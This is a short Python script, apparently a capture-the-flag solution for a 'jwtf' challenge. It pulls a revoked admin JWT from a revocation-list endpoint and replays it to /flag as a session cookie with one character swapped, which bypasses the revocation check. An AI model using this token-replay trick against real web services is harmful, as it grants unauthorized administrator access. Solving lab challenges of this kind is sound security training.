import requests 

URL = "https://jwtf.chal.cyberjousting.com"

r = requests.get(
    f"{URL}/jrl"
)

jwt = r.text[2:-3]
print(jwt)
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTMzNyJ9.NPRE_IxezKiALwrpSQkHy2DxuJEXmHblTYtvGUo-1Gw
print(r.status_code) 

r = requests.get(
    f"{URL}/flag", 
    cookies={"session": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTMzNyJ9.NPRE_IxezKiALwrpSQkHy2DxuJEXmHblTYtvGUo+1Gw"}
)

print(r.text)
print(r.status_code)